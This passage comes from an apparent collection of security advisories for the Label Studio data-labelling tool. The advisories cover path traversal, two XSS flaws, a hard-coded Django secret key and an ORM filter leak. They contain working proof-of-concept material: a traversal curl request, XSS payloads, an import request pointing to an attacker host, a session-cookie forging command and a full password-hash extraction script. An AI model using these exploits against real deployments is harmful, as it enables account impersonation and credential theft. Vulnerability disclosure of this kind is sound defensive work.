/label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, file_content))\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(project, file_upload_ids)\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n1. The file name that was set was retrieved from the URL.\n\nThe downloaded file path could then be retrieved by sending a request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]` where `{project_id}` was the ID of the project and `{download_id}` was the ID of the downloaded file. Once the downloaded file path was retrieved by the previous API endpoint, the [following code snippet](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/api.py#L595C1-L616C62) demonstrated that the `Content-Type` of the response was determined by the file extension, since `mimetypes.guess_type` guesses the `Content-Type` based on the file extension.\n\n```python\nclass UploadedFileResponse(generics.RetrieveAPIView):\n    permission_classes = (IsAuthenticated,)\n\n    @swagger_auto_schema(auto_schema=None)\n    def get(self, *args, **kwargs):\n        request = self.request\n        filename = kwargs['filename']\n        # XXX needed, on windows os.path.join generates '\\' which breaks FileUpload\n        file = settings.UPLOAD_DIR + ('/' if not settings.UPLOAD_DIR.endswith('/') else '') + filename\n        logger.debug(f'Fetch uploaded file by user {request.user} => {file}')\n        file_upload = FileUpload.objects.filter(file=file).last()\n\n        if not file_upload.has_permission(request.user):\n            return Response(status=status.HTTP_403_FORBIDDEN)\n\n        file = file_upload.file\n        if file.storage.exists(file.name):\n            content_type, encoding = mimetypes.guess_type(str(file.name)) <1>\n            content_type = content_type or 'application/octet-stream'\n            return RangedFileResponse(request, file.open(mode='rb'), content_type=content_type)\n        else:\n            return Response(status=status.HTTP_404_NOT_FOUND)\n```\n1. Determines the `Content-Type` based on the extension of the uploaded file by using `mimetypes.guess_type`.\n\nSince the `Content-Type` was determined by the file extension of the downloaded file, an attacker could import in a `.html` file that would execute JavaScript when visited.\n\n# Proof of Concept\n\nBelow were the steps to recreate this issue:\n\n1. Host the following HTML proof of concept (POC) script on an external website with the file extension `.html` that would be downloaded to the Label Studio website.\n\n```html\n<html>\n    <body>\n        <h1>Data Import XSS</h1>\n        <script>\n            alert(document.domain);\n        </script>\n    </body>\n</html>\n```\n\n2. Send the following `POST` request to download the HTML POC to the Label Studio and note the returned ID of the downloaded file in the response. In the following POC the `{victim_host}` is the address and port of the victim Label Studio website (eg. `labelstudio.com:8080`), `{project_id}` is the ID of the project where the data would be imported into, `{cookies}` are session cookies and `{evil_site}` is the website hosting the malicious HTML file (named `xss.html` in the following example).\n\n```http\nPOST /api/projects/{project_id}/import?commit_to_project=false HTTP/1.1\nHost: {victim_host}\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\ncontent-type: application/x-www-form-urlencoded\nContent-Length: 43\nConnection: close\nCookie: {cookies}\nPragma: no-cache\nCache-Control: no-cache\n\nurl=https://{evil_site}/xss.html\n```\n\n3. To retrieve the downloaded file path could be retrieved by sending a `GET` request to `/api/projects/{project_id}/file-uploads?ids=[{download_id}]`, where `{download_id}` is the ID of the file download from the previous step.\n\n4. Send your victim a link to `/data/{file_path}`, where `{file_path}` is the path of the downloaded file from the previous step. The following screenshot demonstrated executing the POC JavaScript code by visiting `/data/upload/1/cfcfc340-xss.html`.\n\n![xss-import-alert](https://user-images.githubusercontent.com/139727151/282223222-d8f9132c-838e-4aa6-9c03-a2bc83b4a409.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* For all user provided files that are downloaded by Label Studio, set the `Content-Security-Policy: sandbox;` response header when viewed on the site. The `sandbox` directive restricts a page's actions to prevent popups, execution of plugins and scripts and enforces a `same-origin` policy ([documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox)).\n* Restrict the allowed file extensions that could be downloaded.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.10.1"],"id":"GHSA-fq23-g58m-799r","link":"https://osv.dev/vulnerability/GHSA-fq23-g58m-799r","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-43791"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability was found to affect versions before `1.8.2`, where a patch was introduced.\n\n# Overview\n\nIn [Label Studio version 1.8.1](https://github.com/HumanSignal/label-studio/tree/1.8.1), a hard coded Django `SECRET_KEY` was set in the application settings. The Django `SECRET_KEY` is used for signing session tokens by the web application framework, and should never be shared with unauthorised parties.\n\nHowever, the Django framework inserts a `_auth_user_hash` claim in the session token that is a HMAC hash of the account's password hash. That claim would normally prevent forging a valid Django session token without knowing the password hash of the account. However, any authenticated user can exploit an Object Relational Mapper (ORM) Leak vulnerability in Label Studio to leak the password hash of any account on the platform, which is reported as a separate vulnerability. An attacker can exploit the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) and forge session tokens for all users on Label Studio using the hard coded `SECRET_KEY`.\n\n# Description\n\nBelow is the code snippet of the Django settings file at [`label_studio/core/settings/base.py`](https://github.com/HumanSignal/label-studio/blob/1.8.1/label_studio/core/settings/base.py#L108).\n\n```python\n# SECURITY WARNING: keep the secret key used in production secret!\nSECRET_KEY = '$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n'\n```\n\nThis secret is hard coded across all instances of Label Studio.\n\n# Proof of Concept\n\nBelow are the steps that an attacker could do to forge a session token of any account on Label Studio:\n\n1. Exploit the ORM Leak vulnerability (patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to retrieve the full password hash that will be impersonated. For this example, a session token will be forged for an account with the email `ghostccamm@testvm.local` with the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=` that was retrieved.\n\n2. Create a new Django project with an empty application. In `cookieforge/cookieforge/settings.py` set the `SECRET_KEY` to `$(fefwefwef13;LFK{P!)@#*!)kdsjfWF2l+i5e3t(8a1n`. Create a management command with the following code that will be used to create forged session tokens.\n\n```python\nfrom typing import Any\nfrom django.core.management.base import  BaseCommand, CommandParser\nfrom django.core import signing\nfrom django.utils.crypto import salted_hmac\nfrom django.conf import settings\nimport time, uuid\n\nclass Command(BaseCommand):\n    help = \"Forge a users session cookie on Label Studio\"\n\n    def add_arguments(self, parser: CommandParser) -> None:\n        parser.add_argument(\n            '-o', '--organisation',\n            help='Organisation ID to access',\n            default=1,\n            type=int\n        )\n\n        parser.add_argument(\n            'user_id',\n            help='The User ID of the victim you want to impersonate',\n            type=str\n        )\n\n        parser.add_argument(\n            'user_hash',\n            help='The password hash the user you want to impersonate'\n        )\n\n    def handle(self, *args: Any, **options: Any) -> str | None:\n        key = settings.SECRET_KEY\n        # Creates the _auth_user_hash HMAC of the victim's password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    